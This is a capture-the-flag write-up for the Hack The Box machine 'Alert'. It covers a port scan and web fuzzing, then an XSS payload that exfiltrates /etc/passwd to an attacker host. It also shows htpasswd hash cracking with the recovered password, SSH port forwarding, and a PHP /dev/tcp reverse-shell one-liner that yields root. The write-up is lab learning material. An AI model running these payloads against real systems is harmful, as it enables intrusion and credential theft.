+++
title = "HTB - Alert"
date = 2024-12-02
+++

### Scan
```
nmap -sV -sC -p- --open 10.10.11.44            
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-01 22:26 EST
Nmap scan report for 10.10.11.44
Host is up (0.13s latency).
Not shown: 65532 closed tcp ports (reset), 1 filtered tcp port (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA)
|   256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA)
|_  256 cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://alert.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.96 seconds
```

### Enumeration
Only Apache and SSH.
File Upload Application. Runs HelpDeskZ v1.0.2. Additionally, app written in PHP.
Feroxbuster and Ffuf:
```
feroxbuster -u http://alert.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php

ffuf -c -u http://alert.htb -H "Host: FUZZ.alert.htb" -w /usr/share/wordlists/seclists/SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt -fc 301
```
We find a few tucked away directories that aren't viewable, and we find a subdomain at `statistics.alert.htb` that requires credentials.

We can start a python instance, and create a markdown file that will include a file-read feature. We have the ability to upload this file, then receive a link that points to the file on the webserver. When we contact the machine through the form and include that link, we are able to get a hit back on our python instance. I have no clue how this works.

```
<script>  
fetch("http://alert.htb/messages.php?file=/etc/passwd")  
  .then(response => response.text())  
  .then(data => {  
    fetch("http://10.10.xx.xx:8888/?file_content=" + encodeURIComponent(data));  
  });  
</script>
```

Unbeknownst to me, two important files here lie in the `/var/www/statistics.alert.htb/.htpasswd` and `/etc/apache2/sites-enabled/000-default.conf` files. This is why working with different web instances is important.

When we do look at these files, we get URL encoded answers to our questions. We can decode them online or with Burp. Below is the hash we found for user `Albert`. When cracking with `john`, USE THE FULL HASH
`albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/`
`echo 'albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/' > al.hash`
`john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long al.hash`
We find the password to be `manchesterunited`
SSH into the box: `ssh albert@alert.htb`
USER:`2c7d0ab0b886f530db14b00bcea6cd11`

Linpeas on the box, we see quite a glaring vulnerability in https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation.git
Didnt work
Instance running on 8080. Forward the port to 9001 on our machine: `ssh -L 9001:localhost:8080 albert@alert.htb`
We can get a sense of the structure of the application by perusing the `/opt` folder. There is a configuration folder within the monitoring webapp that we can drop a reverse shell into and access via our forwarded port.
Simply navigate to the `/opt/website-monitor/config` directory, create a PHP one-liner and save it to `oof.php`:
`<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.10/4545 0>&1'"); ?>`
Start your listener on 4545: `rlwrap nc -nvlp 4545`
Then, navigate to http://localhost:9001/config/oof.php
Bingo. Do research on this box man... Unfamiliar concepts.
ROOT:`6043e2e771e2b63c8d5e244583e5947e`